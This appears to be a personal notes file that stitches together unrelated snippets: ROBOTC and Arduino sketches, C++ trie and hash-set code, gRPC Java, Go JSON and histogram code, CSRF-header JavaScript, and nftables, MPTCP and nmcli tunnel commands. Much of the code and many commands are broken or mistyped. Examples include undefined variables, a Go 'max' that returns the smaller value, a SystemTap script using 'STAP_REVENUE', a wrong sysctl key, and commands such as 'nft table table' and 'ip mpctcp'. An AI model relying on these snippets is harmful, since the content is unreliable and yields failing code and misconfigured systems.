<RobotConfiguration>#pragma config(Sensor, port2,  touchLED,       sensorVexIQ_LED)
#pragma config(Sensor, port3,  colorDetector,  sensorVexIQ_ColorHue)
#pragma config(Sensor, port4,  gyroSensor,     sensorVexIQ_Gyro)
#pragma config(Sensor, port7,  distanceMM,     sensorVexIQ_Distance)
#pragma config(Sensor, port8,  bumpSwitch,     sensorVexIQ_Touch)
#pragma config(Motor,  motor1,          leftMotor,     tmotorVexIQ, openLoop, driveLeft, encoder)
#pragma config(Motor,  motor6,          rightMotor,    tmotorVexIQ, openLoop, reversed, driveRight, encoder)
#pragma config(Motor,  motor10,         armMotor,      tmotorVexIQ, openLoop, encoder)
#pragma config(Motor,  motor11,         clawMotor,     tmotorVexIQ, openLoop, encoder)
//*!!Code automatically generated by 'ROBOTC' configuration wizard               !!*//
</RobotConfiguration>

<CSource>#pragma config(Sensor, port2,  touchLED,       sensorVexIQ_LED)
#pragma config(Sensor, port3,  colorDetector,  sensorVexIQ_ColorHue)
#pragma config(Sensor, port4,  gyroSensor,     sensorVexIQ_Gyro)
#pragma config(Sensor, port7,  distanceMM,     sensorVexIQ_Distance)
#pragma config(Sensor, port8,  bumpSwitch,     sensorVexIQ_Touch)
#pragma config(Motor,  motor1,          leftMotor,     tmotorVexIQ, openLoop, driveLeft, encoder)
#pragma config(Motor,  motor6,          rightMotor,    tmotorVexIQ, openLoop, reversed, driveRight, encoder)
#pragma config(Motor,  motor10,         armMotor,      tmotorVexIQ, openLoop, encoder)
#pragma config(Motor,  motor11,         clawMotor,     tmotorVexIQ, openLoop, encoder)
//*!!Code automatically generated by 'ROBOTC' configuration wizard               !!*//


task main()
{
repeat (forever){

if(getColorName(colorDetector) == colorRed){
stopAllMotors();

}else{
setMultipleMotors(20,leftMotor,rightMotor,noMotor,noMotor);
}}
}
</CSource>

-----------------------------------------------------------------------------------------------
Defining a data structure that support all operations 
---------------------------------------------------------

#include<bits/stdc++.h >
using namespace std;
class Solution {
vector<int> arr;
map <int,int> map;
public :
 void add(int x) {
 if(Map.find(x) != Map.end(())
 return;
 int index = arr.size();
 arr.push_back(x);
 Map.insert(std::pair<int,int>(x,index)));
 
 }
 void remove (int x) {
 if(Map.find(x) == Map.end())
 return;
  int index = Map.at(x);
  Map.erase(x);
  in tlast = arr.size() - 1;
  swap(arr[index],arr[last]);
  arr.pop_back();
Map.at(arr[index]) = index;
  }
  int search(int x) 
  {
  if(Map.find(x) != Map.end())
  return Map.at(x);
  return -1;
  
  }
  int getRandom()
  {
  srand(time(NULL));
  int random_time = rand() % arr.size();
  return arr.at(random_index);
  
  }

};


---------------------------------------------------------------------------------------------------------------------
Trie Boggle
----------------

#include<iostream.h>
#include<bits/stdc++.h>
using namespace std;

#define SIZE[26]
#define M 3
#define N 3
define char_int(c) ((int)c - ((int)'A')
struct trieNode {
TrieNode* child[SIZE];
bool leaf;

};
TrieNode* getNode()
{
TrieNOde* newNode = new TrieNode;
NewNode->leaf = false;
for(int i = 0;i < SIZE;i++)
{
newNode->Child[i] = NULL;
return newNode;

}

void insert(TrieNOde* root, char* key)
{
int n = strlen(key);
TrieNode* pChild = root;
for(int i =0 ; i< n;i++){
itn index = char_int(key[i]);

if(Child)
}
}
}
-----------------------------

mvn archetypes:generate -DgroupId=com.example.grpc
-DartifactId = grps-hello-server
-DarchetypeArtifactId == maven-archetype-quickstart
-DinteractiveMode=false

cd grpc-hello-server

mkdir -p src/main/proto



import io.grpc.StreamObserver;
public class GreetingServiceImpl extends GreetingserviceGrpc.GreetingServiceImplBase 
{
@override
public void greeting(GreetingServiceOuterClass.HelloRequest request,
StreamObserver<GreetingServiceOuterClass.HelloResponse> responseObserver)
{
System.out.println(request);

GreetingServiceOuterClass.HelloResponse response = GreetingServiceouterClass.HelloResponse.newBuilder()
.setGreeting("Hello there", + request.getName())
.build();

responseObserver.onNext(response);
responseObserver.OnComplete();


}
}
---------------------------------------------------------------------------------------
public class App
{
public static void main(String[] args)throws Exception{
Server server = ServerBuilder.forPort(8080);
.addService(new GreetingServiceImpl())
.build();

server.start();

System.out.println("Server started");
server.awaitTermination();

}
}
-------------------------------------------------------------------------------
mvn -DskipTests package exec:java -Dexec.mainClass=com.example.grpc.App

JSON in Go Language 
------------------------
func Marshal(v interface{}) ([]byte,error)

type Message struct 
{
Name string
Body string
Time int64

}
encode 
---------
m:= Message("Alice","Hello",1234567890)
b,err := json.Marshal(m)
b  =[]byte(`{"Name" : "Alice","Body": "Hello","Time" : 1234567891}`)


decode
-----------
func Unmarshal(data []byte, v interaface{}) error
var m Message
err := json.Unmarshal(b, &m)



Go for http--
------------------

http.HandleFunc("/"w , func(w http.ResponseWriter, r *http.Request)
{
i fpusher, ok := w.(http.Pusher); ok {
if err := pusher.push("./apps.js", nil); err != nil{
log.printf("GFailed to push  : %v", err)

}
}
})

-------------------------------------------------------------------
go for all spaces 
------------------------

package "abcd"

import "strings" 

func fulljustify(word[] string, maxWidth int ) [] string 
{
res := []string{}
temp := []string{}
when := 0
isLasr := false

for !isLast
{
words, temp, width, isLast = split(words, maxWidth)
res = append(res, combine(temp, width, maxWidth, isLast))
 
}
return res

}

func split(words []string, maxWidth int) ([]string, []string, int, bool)
{
temp := make([]string,1)
temp[0] := words[0]
width := len(words[0])

i := 1

for; i < len(words); i++
{
if width+ len(temp)+lem(words[i] > maxWidth) 
{
break
}
temp = append(temp, words[i])
width += len(words[i])
}

return words[i:], temo, widthm i == len(words)

}

func combine(word []string, width =, maxWidth =, int , isLast bool ) string 
{
wordCount := len(words)
if(wordCount == 1 || isLast)
{
return combineSpecial(words,maxWidth)

}
spaceCount := wordCount -1

spaces := makeSpaces(spaceCount, maxWidth-width)

res :=""


}
return res


}

func makeSpaces(len , count int) []string{
res := make([]string, len)
for i:= 0 ;i < count; i++


{
res[i%len] += ""

}
return res
}

func combineSpec (words []string, maxWidth int ) string{
res := strings.Join(words, "")
for len(res) < maxwidth 
{

res += ""
}
return res

}


---------------------------------------------------------------------------------

Largest rectangle in histogram 
--------------------------------

func largestRectangleArea(heights []int) int 
{
heights = append([]int{-2}, heights...)
heights = append(heights, -1)

size := len(heights)
stack :=  make([]int, 1, size)

end := 1
res := 0 
for end < size 
{
if heights[stack[]len(stack) - 1]] < heights[end] 
{
stack := append(stack,end)
end++
continue

}

begin := stack[len(stack)-2]
index := stack[len(stack)-1]
height := heights[index]
area := (end-begin -1) * height
res = max(res, area)
stack = stack[:len(stack)-1]

}
return res

}
 func max(a, b int) int 
 {
 if a < b 

{
return a
}
return b1
 }
 
 ---------------------------------------------------------------------------------
 
 XMLHTTPREQUEST
 ----------------
 
 <script type = "text/javascript">
  var csrf_token = document.querySelector("meta[name = 'csrf_token']").getAttribute("content");
  function  csrfSfaeMethod (method)
  {
  return (/^(GET|HEAD|OPTIONS)$./text(method));
  
  }
  
  var  o = XMLHttpRequest.prototype.open;
  XMLHttlRequest.prototype.open = function()
  {
  var res = o.apply(this,argument);
  var err = new Error();
  if(! csrfSafeMethod(arguments[0]))
  {
  this.setRequestHeader('anticsrf_token', csrf_token);
  
  }
  return res;
  
  };
  </script>
  
----------------------------------------------------------------------------------

  AngularJS
  -----------
  
 <script>
 
 var csrf_token = document.querySelector("meta[name='csrf_token']"),getAttribute("content");
 var app = angular.module("app", []);
 
 app.config(['$httpProvide', function ($httpProvider)
 $httpProvider.defaults.headers.post["anti-csrf-token"] = csrf_token;
 $httpProvider.defaults.headers.put["anti-csrf-token"] = csrf_token;
 $httpProvider.defaults.headers.patc["anti-csrf-token"] = csrf_token;
 
 
 $httpProvider.defaults.headers.delete = {
 
 "Content-Type" : "application/json:charset=utf-8",
 "anti-csrf-token" : csrf_token
 };
 $httpProvider.defaults.headers.trace = {
 "Content-Type" : "application/json:charset=utf-8",
 "antu-csrf-token" : csrf_token
 };
 
 
 {
 
 }]);
 </script>
 
 
 ------------------------------------------------------------------------
 
 nftable
 --------------------------------------------------
 
 The nftables framework provides packet classification facilities and it is the designated successor to the iptables, ip6tables, arptables, and ebtables tools. It offers numerous improvements in convenience, features, and performance over previous packet-filtering tools, most notably:

lookup tables instead of linear processing
a single framework for both the IPv4 and IPv6 protocols
rules all applied atomically instead of fetching, updating, and storing a complete rule set
support for debugging and tracing in the rule set (nftrace) and monitoring trace events (in the nft tool)
more consistent and compact syntax, no protocol-specific extensions
a Netlink API for third-party applications

migrate from iptable to nftables 

iptables-translate -A INPUT -j CHECKSUM --checksum-fill
nft # -A INPUT -j CHECKSUM --checksum-fill

iptables-save > /tmp/tptables.dump
iptables-restore-translate - f /tmp/iptables.dump

iptables-save 
iptables-restore-translate


writing nftables
--------------------

#!/usr/sbin/nft -f


flush ruleset 
table inet example_table {
chain example_chain {
type filter hook input prority 0; policy drop;
tcp dport ssh accept
# for port ssh (22)

}
}



simlilarly 


flush ruleset
add table inet example_table
add chain inet example example_chain {
type filter hook  input priority 0;
policy drop; 
}

add rule inet example_table example_chain tcp dport ssh accept 



run nftable 

/etc/nftables/example_firewall.nft


chown root /etc/nftables/exmap_firewall.nft

 /etc/nftables/exmap_firewall.nft
 # run 
 
 systemctl enable nftables
 systemctl start nftables 


chains
---------
nft add chain inet exmaple_table {type filter hook input priority security \; policy accept \;}


display all ruleset

-------


nft list ruleset


to insert a rule 
----------------------
nft insert rule inet example_table example_chain tcp dport 22 accept




configuring NAT with nftables 
-------------------------------
Masquerading 
SourceNAT 
DestinationNAT 



SNAT sets the source IP address of packets to a specified IP and does not dynamically look up the IP of the outgoing interface. Therefore, SNAT is faster than masquerading. Use SNAT if the outgoing interface uses a fixed IP address.





NAT 
---

nft add table nat 

nft --add chain nat prerouting {type nat hook prerouting priority -100 \; }
nft add chain nat postrouting {type nat hook postrouting priority 100 \? }
nft add rule nat postrouting oifname "ens3" masquerade
nft add rule nat postrouting ofiname "ens3" snat to 192.0.2.1
nft add rule nat prerouting iifname ens3 tcp dport {80, 443 } dnat to 192.0.2.1
nft add rule na postrouting  oifname "ens3" snat to 198.53.1.2


using sets in nftables
-------------------------
or example, to add a rule to example_chain in example_table that allows incoming traffic to port 22, 80, and 443:

# nft add rule inet example_table example_chain tcp dport { 22, 80, 443 } accept
Optionally, display all chains and their rules in example_table:

# nft list table inet example_table
table inet example_table {
  chain example_chain {
    type filter hook input priority filter; policy accept;
    tcp dport { ssh, http, https } accept
  }
}

nft add set inet example_table exmaple-set 
 {type ipv4_address\; }

nft add set inet exmaple_table exmaple_set  {type ipv4_addr \? flags interval \; } 

 
nft add element inet example_table example_set {192.0.2.1,  192.0.2.2}



nft add rule inet exammple_table incoming_traffic ip protocol vmap {tcp : jump tcp_packets, udp : jump udp_packets }



table inet example_table {
chain tcp_packets 
{
coungter packets 213235 bytes 213243243

}
 chain udp_packets 
 {
 counter packets 10 byte 1539
 
 }
 
 chain incoming traffic  {
 type filter hook input priority  filter ; policy accept ;
 ip protocol vmap {tcp : jump tcp-packets , udp  : {
 jump udp_packets }
 
 }
 }

}



ipv4_addr for a map whose match part contains an IPv4 address, such as 192.0.2.1.
ipv6_addr for a map whose match part contains an IPv6 address, such as 2001:db8:1::1.
ether_addr for a map whose match part contains a media access control (MAC) address, such as 52:54:00:6b:66:42.
inet_proto for a map whose match part contains an Internet protocol type, such as tcp.
inet_service for a map whose match part contains an Internet services name port number, such as ssh or 22.
mark for a map whose match part contains a packet mark. A packet mark can be any positive 32-bit integer value (0 to 2147483647.
counter for a map whose match part contains a counter value. The counter value can be any positive 64-bit integer value.
quota for a map whose match part contains a quota value. The quota value can be any positive 64-bit integer value.



nft add rule example_table example_chain ip saddr vmap @example_map

nft add element ip example_table example_map { 192.0.2.1 : accept, 192.0.2.2 : drop }


table ip example_table {
  map example_map {
    type ipv4_addr : verdict
    elements = { 192.0.2.2 : drop, 192.0.2.3 : accept }
  }

  chain example_chain {
    type filter hook input priority filter; policy accept;
    ip saddr vmap @example_map
  }
}



ip forwarding with nftables
-----------------------------

nft add table ip nat 
 
nft -- add chain ip nat prerouting  {type nat hook prerouting priority -100 \; }

nft add rule ip nat prerouting rcp dport 8022 redirect to :22

nft add rule ip nat postrouting {type nat hook postrouting priority 100 \; }

nft add rule ip nat prerouting tcp port 443 dnat to 192.0.2.1
nft add rule ip daddr 192.0.2.1 masquerade 

echo "inet.ipv4.ip_forward=1" > /etc/sysctl.d/95-IPV4-forwarding.conf
sysctl -p /etc/sysctl.d/95-IPV4-forwarding.conf


nft add rule ip exmaple_table exmaple chain tcp dport ssh meter exmaple_meter
{
ip sadde ct count over 2
 } counter reject 
 
 
 
 nft list meter ip exmaple_table example_meter
 

table ip example_table {
  meter example_meter {
    type ipv4_addr
    size 65535
    elements = { 192.0.2.1 : ct count over 2 , 192.0.2.2 : ct count over 2  }
  }
}

nft table table ip filter 

nft add chain ip filter input  { type filter hook input priority 0 \; }

nft add set ip filter blackl;ist  {type ipv4_addr \; flags dyamic, timeout \; timeout 5m \; }

nft add rule ip filter input ip protocol tccp ct state new, untrackes limit rate over 10/minute add @blacklist { ip saddr }
nft add rule ip filter input ip sadde @blacklist drop 


Debugging nftables rules 
-----------------------------
creating a rule with the counter
----------------------------------

nft add rule  inet exmaple_table exmaple_chain tcp dport 22 counter accept 

nft list ruleset  
table inet exmapl_table  {
chain example_chain   {
type filter hook input priority filter;; plicy accept 
tcp dport ssh counter packets 6872 bytes 105448565 accept


}
}

adding a counter to an existing rule 
-----------------------------------------

nft --handle list chai inet example_table exmaple_chain
table inet example_table {
  chain example_chain { # handle 1
    type filter hook input priority filter; policy accept;
    tcp dport ssh accept # handle 4
  }
}


nft replace rule inet exmapl_table example_chain handle 4 tcp dport 22 counter 
accept 


nft list ruleset 

monitor packets that match an existing rule 
-----------------------------------------------

# nft --handle list chain inet example_table example_chain
table inet example_table {
  chain example_chain { # handle 1
    type filter hook input priority filter; policy accept;
    tcp dport ssh accept # handle 4
  }
}

nft replace rule inet exammple_table example_chain handle 4 tcp dport 22 metanftrace set 1 accept 

nft monitor | grep "inet example_table example_chain "



backing up and restoring 
----------------------------

nft list ruleset  > file.nft 

nft -j list ruleset > files.json 

nft -f file.nft 

nft -j -f file.json 



 



nft add element inet example_table example_set {192.0.2.0-192.0.2.255 }




using verdict maps in nftables  
------------------------------------





MPTCP 
-------

# echo "net.mptcp.enabled=1" > /etc/sysctl.d/90-enable-MPTCP.conf
# sysctl -p /etc/sysctl.d/90-enable-MPTCP.conf



#! usr/bin/env stap 

%{
#include <linux/in.h>
#include <linux/ip.h>
%}

function mtpcpify () %{
if(CONTEXT->kregs->si == SOCK_STREAM && 
(CONTEXT->kregs->dx == IPPROTO_TCP   ||
CONGTEXT->kregs->dx == 0))
{
CONTEXT->kregs->dx = IPPROTO_MPTCP;
STAP_REVENUE = 1;

}else{
STAP_REVENUE = 0;

}
%}

probe kernel.function("__sys_socket"
{
if (mptcpify() == 1)
{
printf("command %16s mptcpified\n", execname());

}
})


replace the stap 

stap -vg mptcp.stap

TCP listen to port 4321
---------------------------

ncat -4 -l 4321



verify 
sysctl -a | grep mptcp.enabled
net.mptcp.enabled = 1

dmesg


ss -nti '(dport :4321)' dst 192.0.2.1


//OUTPUT 
State Recv-Q Send-Q Local Address:Port    Peer Address:Port Process

ESTAB 0      0          192.0.2.2:60874      192.0.2.1:4321
cubic wscale:7,7 rto:201 rtt:0.042/0.017 mss:1448 pmtu:1500 rcvmss:536 advmss:1448 cwnd:10 bytes_sent:64 bytes_$cked:65 segs_out:6 segs_in:5 data_segs_out:4 send 2758095238bps lastsnd:57 lastrcv:3054 lastack:57 pacing_rate 540361516$bps delivery_rate 413714280bps delivered:5 rcv_space:29200 rcv_ssthresh:29200 minrtt:0.009 tcp-ulp-mptcp flags:Mmec token:0000(id:0)/4bffe73d(id:0) seq:c11f40d6c5337463 sfseq:1 ssnoff:f7455705 maplen:0

capture traffic 
tcpdump -tnni interface tcp port 4321


using iproute2 to notify applicatiosn about multiple available paths 
----------------------------------------------------------------------

ip mpctcp limits set subflow 1
ip mptcp limits set subflow 1 add _addr_accepted 1
ip mpctcp endpoint add 198.51.100.1 dev enp1s0 signal 




info 
----------
signal, sends an ADD_ADDR packet after the three-way-handshake is completed
subflow, sends an MP_JOIN SYN by the client
backup, sets the endpoint as a backup address

---------------

start the client 
------------------

ncat -4 0.0.0.0 -k -l 4321
--------------------------------

verify 
--------

ip mpctcp limit show 
ip mpctcp endpoint show 
tcpdump -tnni interface tcp port 4321


disabling mcptcp 
------------------
echo "net.mptcp.enabled=0" > /etc/sysctl.d/90-enable-MPTCP.conf
sysctl -p /etc/sysctl.d/90-enable-MPTCP.conf

sysctl -a | grep mptcp.enabled



bridges 
--------------

nmcli connection add type bridge con-name bridge0 ifname bridge0

nmcli device status 

nmclid connection add type ethernet slave-type bridge con-name bridge0-port1

SYSTEMD NETWORK TARGETS AND SERVICES
-----------------------------------------


configuring the order of DNS Servers
-------------------------------------


consuming grpc 
------------------




VPN Connection 
---------------

NetworkManager-libreswan-gnome
 package is installed
 
 
 
 Press the Super key, type Settings, and press Enter to open the control-center application.
Select the Network entry on the left.
Click the + icon.
Select VPN.
Select the Identity menu entry to see the basic configuration options:

General

Gateway — The name or IP address of the remote VPN gateway.


Authentication 
----------------

IKEv2 (certificate)
authenticate by certificate 
IKEv1 
(XAUTH) client is authenticated byusername and passwor or a pre shared Key (PSK)



Domain 
Phase1 Algorithm - IKE  librespawn parameter
Phase2 Algorithm - ESP for IPSEC 
with PFS Field 
Phase1 Lifetime  - ikelifetime 
Phase2 Lifetime  - salifetime
Remote Network  rightsubnet librespawn parameter
the destination 
Enable Fragmentation  valid yes or no 
Enable Mobike  corresponds to mobike librespawn parameter whether to allow mobility and multihoming protocol (MOBIKE, RFC 4555)
to enable a connection to migrate its endpoint without needing to restart the connection 
from 
scratch 
This is used on mobile devices that switch between wired , wireless , or mobile data connection 



IPV4 Method 
-----------------
 Automatic (DHCP)
 
 Link- Local only 
	
	 Choose this option if the network you are connecting to does not have a DHCP server and you do not want to assign IP addresses manually. Random addresses will be assigned as per RFC 3927 with prefix 169.254/16.
	 
	 Manual 
	 
	 Disable 
	 
	ROutes 
	--------
	
	
	Address
	Netmask 
	gateway
	Metric
	
	
	
	
	
	configuring IP Tunnels 
	-------------------------
	Generic Route encapsulation 
	Generic routing encapsulation over ipv6
	Gneric routing encapsulation Terminal Access point 
	Generic routing encapsulation Terminal Access Point over ipv6
	IPV4 OVER IPv4 (IPIP)
	IPV4 OVER IPv6 (IPIP6)
	IPV6 OVER IPV6  (IP6IP6)
	Simple internet Transmission (SIT)

--------------------------------------------------------------------------
	on Network A 
	
	nmcli connection add type ip-tunnel ip-tunnel.mode ipip con-name tun0 
	ifname tun0 remote 198.51.100.5 local 203.0.113.10
	
	nmcli connection modify tun0 ipv4.addresses '10.0.1.1/30'
	
	nmcli connection modify tun0 ipv4.method manual
	nmcli connection modify tun0 +ipv4.routes "172.16.0.0/24 10.0.1.2"
	
	nmcli connection up tun0 
	
	echo "net.ipv4.ip_forward=1" > /etc/sysctl.d/95-IPv4-forwarding.conf

sysctl -p /etc/sysctl.d/95-IPV4-forwarding.conf


on Network B 
----------------

create an IPIP 
nmcli connection add type ip-tunnel  ip-tunnel.mode ipip con-name tun0 
ifname tun0 remote 203.0.113.10 local 198.51.100.5

set the ipv4 address to the tun0 device 
nmcli connection modify tun0 ipv4.addresses 198.51.100.5

configure the tun0 connection to use a manual ipv4 configuration 
nmcli connection modify tun0 ipv4.method manual 

add a static route  that routes traffic to the 192.0.2.0/24 network to the tunnel IP 
on router A 

nmcli connection modify tun0 +ipv4.routes "192.0.2.0/24 10.0.1.1"

nmcli connection up tun0 

echi "net.ipv4.ip_forward=1" > /etc/sysctl.d/95-IPv4-forwarding.conf
sysctl -p /etc/sysctl.d/95-IPV4-forwarding.conf






verify 

Router A 

ping 172.16.0.1

Router B	
 ping 192.0.2.1
 
 
 
 
 configuring a GRE Tunnel 
 ----------------------------
 create a GRE Tunnel 
 nmcli connection add type ip-tunnel ip-tunnel.mode gre con0name gre1 ifname gre1 remote 198.51.100.5 local 203.0.113.1.0
 
 nmcli connection modify gre1 ipv4.addresses '10.0.1.1/30'
 
 nmcli connection modify gre1 ipv4.method manual 
 
 nmcli connection modify tun0  +ipv4.routes "172.16.0.0/24 10.0.1.2"

nmcli  connection up gre1 
 
 echo "net.ipv4.ip_forward=1" > /etc/sysctl.d/95-IPv4-forwarding.conf
# sysctl -p /etc/sysctl.d/95-IPv4-forwarding.conf



//Same on Router B 


and Same verification 




configuring a GRETAP tunnel to transfer Ethernet frames over IPV4 
---------------------------------------------------------------------

nmcli connection add type bridge con-name bridge0 ifname bridge0
nmcli connection modify bridge0 ipv4.addresses '192.0.2.1/24'

nmcli connection modify bridge0 ipv4.method manual
nmcli connection add type ethernet slave-type bridge con-name bridge0-port1
ifname enp1s0 master bridge0


nmcli connection add type ip-tunnel ip-tunnel.mode gretap slave-type bridge 
con-name bridge0-port2 ifname gretap1 remote 198.51.100.5 local 203.0.113.10
master bridge0
nmcli connection modfiy bridge0 brodge.stp no 

nmcli connection modify bridge0 connection.autoconnect-slaves 1


nmcli connection up bridge0


//same way on router B 


can verify 

like 

nmcli device
ping 192.0.2.2
ping 198.1.2.16


-----------------------------------------------------------------------------'
Arduino Microsoft Mute button click 
------------------------------------
#include <keyboard.h>
#include <Adafruit_CircuitPlayground.h>

const int MUTE_BUTTON = 6;
const int DEBOUNCE_DELAY = 50;

char ctrlKey = KEY_LEFT_CTRL;

int slideCounter = 0;
int currentButtonState = 0;
int lastSteadyState = 0;
int lastFlickerableState = 0;
int lastDebounceTime = 0;


void setup()
{
CircuitPlayground.begin();
pinMode(MUTE_BUTTON, INPUT_PULLDOWN);
Serial.Begin(115200);

Keyboard.begin();
Serail.println("Ready to deploy Move the CPX slide switch to the left  to enable the mute button ");

}
void loop()
{
while(CircuitPlayground.slideSwitch())
{
if(slideCounter == 0)
{
Serialprintln("Ready to Mute ");
slideCounter += 1;

}
currentButtonState = digitalRead(MUTE_BUTTON);
lastDebounceTime = millis();
lastFlickerableState = currentButtonState;
}
if((millis() - lastDebounceTime)  > DEBOUNCE_DELAY)
{
if(lastSteadyState == 1 && currentButtonState == 0)
{
CircuitPlayground.redLED(HIGH);
Serail.println("Pressed");
keyboard.press(ctrlKey);
keyboard.press(KEY_LEFT_CTRL);
keyboard.press('m');

}
lastSteadyState = currentButtonState;
CicuitPlayground.redLED(LOW);
keyboard.releaseAll();

}
slideCounter = 0;
keyboard.releaseAll();


}







 
 
 ARDUINO ULTRASONIC SENSOR 
 ----------------------------
 
 
 
 const int pingPin = 7; // Trigger Pin of Ultrasonic Sensor
const int echoPin = 6; // Echo Pin of Ultrasonic Sensor

void setup() {
   Serial.begin(9600); // Starting Serial Terminal
}

void loop() {
   long duration, inches, cm;
   pinMode(pingPin, OUTPUT);
   digitalWrite(pingPin, LOW);
   delayMicroseconds(2);
   digitalWrite(pingPin, HIGH);
   delayMicroseconds(10);
   digitalWrite(pingPin, LOW);
   pinMode(echoPin, INPUT);
   duration = pulseIn(echoPin, HIGH);
   inches = microsecondsToInches(duration);
   cm = microsecondsToCentimeters(duration);
   Serial.print(inches);
   Serial.print("in, ");
   Serial.print(cm);
   Serial.print("cm");
   Serial.println();
   delay(100);
}

long microsecondsToInches(long microseconds) {
   return microseconds / 74 / 2;
}

long microsecondsToCentimeters(long microseconds) {
   return microseconds / 29 / 2;
}




ARDUINO HUMIDITY SENSOR 
--------------------------

#include "DHT.h"
#define DHTPIN 2 // what digital pin we're connected to
// Uncomment whatever type you're using!
//#define DHTTYPE DHT11 // DHT 11
#define DHTTYPE DHT22 // DHT 22 (AM2302), AM2321
//#define DHTTYPE DHT21 // DHT 21 (AM2301)
// Connect pin 1 (on the left) of the sensor to +5V
// NOTE: If using a board with 3.3V logic like an Arduino Due connect pin 1
// to 3.3V instead of 5V!
// Connect pin 2 of the sensor to whatever your DHTPIN is
// Connect pin 4 (on the right) of the sensor to GROUND
// Connect a 10K resistor from pin 2 (data) to pin 1 (power) of the sensor
// Initialize DHT sensor.
// Note that older versions of this library took an optional third parameter to
// tweak the timings for faster processors. This parameter is no longer needed
// as the current DHT reading algorithm adjusts itself to work on faster procs.
DHT dht(DHTPIN, DHTTYPE);

void setup() {
   Serial.begin(9600);
   Serial.println("DHTxx test!");
   dht.begin();
}

void loop() {
   delay(2000); // Wait a few seconds between measurements
   float h = dht.readHumidity();
   // Reading temperature or humidity takes about 250 milliseconds!
   float t = dht.readTemperature();
   // Read temperature as Celsius (the default)
   float f = dht.readTemperature(true);
   // Read temperature as Fahrenheit (isFahrenheit = true)
   // Check if any reads failed and exit early (to try again).
   if (isnan(h) || isnan(t) || isnan(f)) {
      Serial.println("Failed to read from DHT sensor!");
      return;
   }
   
   // Compute heat index in Fahrenheit (the default)
   float hif = dht.computeHeatIndex(f, h);
   // Compute heat index in Celsius (isFahreheit = false)
   float hic = dht.computeHeatIndex(t, h, false);
   Serial.print ("Humidity: ");
   Serial.print (h);
   Serial.print (" %\t");
   Serial.print ("Temperature: ");
   Serial.print (t);
   Serial.print (" *C ");
   Serial.print (f);
   Serial.print (" *F\t");
   Serial.print ("Heat index: ");
   Serial.print (hic);
   Serial.print (" *C ");
   Serial.print (hif);
   Serial.println (" *F");
}
----------------------------------------------------------------------------------------------------------
ARDUINO-TEMPERATURE 
---------------------
float temp;
int tempPin = 0;

void setup() {
   Serial.begin(9600);
}

void loop() {
   temp = analogRead(tempPin);
   // read analog volt from sensor and save to variable temp
   temp = temp * 0.48828125;
   // convert the analog volt to its temperature equivalent
   Serial.print("TEMPERATURE = ");
   Serial.print(temp); // display temperature value
   Serial.print("*C");
   Serial.println();
   delay(1000); // update sensor reading each one second
}



 ----------------------------------------------------------------------------------------------
 
 Water sensor 
 -------------
 #define Grove_Water_Sensor 8 // Attach Water sensor to Arduino Digital Pin 8
#define LED 9 // Attach an LED to Digital Pin 9 (or use onboard LED)

void setup() {
   pinMode(Grove_Water_Sensor, INPUT); // The Water Sensor is an Input
   pinMode(LED, OUTPUT); // The LED is an Output
}

void loop() {
   /* The water sensor will switch LOW when water is detected.
   Get the Arduino to illuminate the LED and activate the buzzer
   when water is detected, and switch both off when no water is present */
   if( digitalRead(Grove_Water_Sensor) == LOW) {
      digitalWrite(LED,HIGH);
   }else {
      digitalWrite(LED,LOW);
   }
}
-------------------------------------------------------------------------------------
PIR Sensor 
-----------------
#define pirPin 2
int calibrationTime = 30;
long unsigned int lowIn ;
long unsigned int pause = 5000;
boolean locklow = true;
boolean takeLowTime;
int PIRValue = 0;

void setup()
{
Serial.begin(9600);
pinMode(pirPin, INPUT);

}

void loop()
{
PIRSensor();
}

void PIRSensor()
{
if(digitalRead(pirPin) == HIGH)
{
if(lockLow)
{
PIRValue = 1;
Locklow = false;
Serial.println("Motion detected .");
delay(50);

}
takeLowTime = true;

}

if(digitalRead(pirPin) == LOW)
{
if(takeLowTime)
{
LowIn - millis();takeLowTime - false;

}
if(!Locklow && millis() - lowIn > pause){
PIRValue = 0;
lockLow = true;
Serial.println("Motion ended.");
delay(50);

}
}
}

-----------------------------------------------------------------------------------

Connecting Switch 
--------------------
const int buttonPin = 8; // the number of the pushbutton pin
const int ledPin = 2; // the number of the LED pin
// variables will change:
int buttonState = 0; // variable for reading the pushbutton status

void setup() {
   // initialize the LED pin as an output:
   pinMode(ledPin, OUTPUT);
   // initialize the pushbutton pin as an input:
   pinMode(buttonPin, INPUT);
}

void loop() {
   // read the state of the pushbutton value:
   buttonState = digitalRead(buttonPin);
   // check if the pushbutton is pressed.
   // if it is, the buttonState is HIGH:
   if (buttonState == HIGH) {
      // turn LED on:
      digitalWrite(ledPin, HIGH);
   } else {
      // turn LED off:
      digitalWrite(ledPin, LOW);
   }
}

--------------------------------------------------------------------------------
DC MOTOR
------------------------------

int motorPin = 9;

void setup() {
   pinMode(motorPin, OUTPUT);
   Serial.begin(9600);
   while (! Serial);
   Serial.println("Speed 0 to 255");
}

void loop() {
   if (Serial.available()) {
      int speed = Serial.parseInt();
      if (speed >= 0 && speed <= 255) {
         analogWrite(motorPin, speed);
      }
   }
}



const int pwm = 2 ; //initializing pin 2 as pwm
const int in_1 = 8 ;
const int in_2 = 9 ;
//For providing logic to L298 IC to choose the direction of the DC motor

void setup() {
   pinMode(pwm,OUTPUT) ; //we have to set PWM pin as output
   pinMode(in_1,OUTPUT) ; //Logic pins are also set as output
   pinMode(in_2,OUTPUT) ;
}

void loop() {
   //For Clock wise motion , in_1 = High , in_2 = Low
   digitalWrite(in_1,HIGH) ;
   digitalWrite(in_2,LOW) ;
   analogWrite(pwm,255) ;
   /* setting pwm of the motor to 255 we can change the speed of rotation
   by changing pwm input but we are only using arduino so we are using highest
   value to driver the motor */
   //Clockwise for 3 secWorking of a Servo Motors
   delay(3000) ;
   //For brake
   digitalWrite(in_1,HIGH) ;
   digitalWrite(in_2,HIGH) ;
   delay(1000) ;
   //For Anti Clock-wise motion - IN_1 = LOW , IN_2 = HIGH
   digitalWrite(in_1,LOW) ;
   digitalWrite(in_2,HIGH) ;
   delay(3000) ;
   //For brake
   digitalWrite(in_1,HIGH) ;
   digitalWrite(in_2,HIGH) ;
   delay(1000) ;
}



-----------------------------------------------------------------------
Servo motor 
--------------


#include <Servo.h>
   Servo myservo; // create servo object to control a servo
   int potpin = 0; // analog pin used to connect the potentiometer
   int val; // variable to read the value from the analog pin

void setup() {
   myservo.attach(9); // attaches the servo on pin 9 to the servo object
}

void loop() {
   val = analogRead(potpin);
   // reads the value of the potentiometer (value between 0 and 1023)
   val = map(val, 0, 1023, 0, 180);
   // scale it to use it with the servo (value between 0 and 180)
   myservo.write(val); // sets the servo position according to the scaled value
   delay(15);
}

